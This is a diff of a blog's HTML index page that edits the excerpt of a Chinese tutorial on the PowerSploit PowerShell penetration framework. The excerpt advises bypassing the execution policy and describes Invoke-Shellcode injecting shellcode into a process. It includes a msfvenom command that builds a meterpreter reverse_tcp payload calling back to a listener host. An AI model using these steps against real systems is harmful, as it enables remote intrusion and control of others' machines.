@@ -171,7 +171,7 @@
     <div class="post-header index">
         <h1 class="title">
             <a href="/2016/10/06/powersploit/">
-                powershell 渗透框架 [ PowerSploit篇 ]
+                powershell 渗透框架 [PowerSploit]
             </a>
         </h1>
         <div class="post-info">
@@ -189,9 +189,8 @@
 
     
         <div class="content">
-            <p><br><br>前言:<br>&nbsp;&nbsp;&nbsp;&nbsp;和nishang一样,PowerSploit也是一款非常实用的powershell渗透框架,下面就其用法做些简要说明<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">Set-ExecutionPolicy Unrestricted 还是一样,先放开脚本执行限制,实际渗透中自己bypass一下就好了</div></pre></td></tr></table></figure></p>
-<p><br></p>
-<p>0x01 命令执行类模块[CodeExecution]:<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">Invoke-Shellcode.ps1 向指定进程中注入我们的shellcode,我们可以通过这种方式弹回一个meterpreter,注意shellcode系统位数版本要跟目标的系统一致才行,另外,权限务够也是必须的</div><div class="line"><span class="comment"># msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.3.6 LPORT=1234 -f powershell -o /root/Desktop/shell.txt</span></div><div class="line"><span class="comment"># msfconsole 监听刚才的payload配置</span></div></pre></td></tr></table></figure></p>
+            <p><br><br>0x01 前言:<br>&nbsp;&nbsp;&nbsp;&nbsp;和nishang一样,PowerSploit也是一款非常实用的powershell渗透框架,下面就其用法做些简要说明<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">Set-ExecutionPolicy Unrestricted 还是一样,先放开脚本执行限制,实际渗透中自己bypass一下就好了</div></pre></td></tr></table></figure></p>
+<p>0x02 命令执行类模块 [CodeExecution]:<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">Invoke-Shellcode.ps1 向指定进程中注入我们的shellcode,我们可以通过这种方式弹回一个meterpreter,注意shellcode系统位数版本要跟目标的系统一致才行,另外,权限务够也是必须的</div><div class="line"><span class="comment"># msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.3.6 LPORT=1234 -f powershell -o /root/Desktop/shell.txt</span></div><div class="line"><span class="comment"># msfconsole 监听刚才的payload配置</span></div></pre></td></tr></table></figure></p>
         </div>
         <a href="/2016/10/06/powersploit/" class="read-more">Read More</a>
     
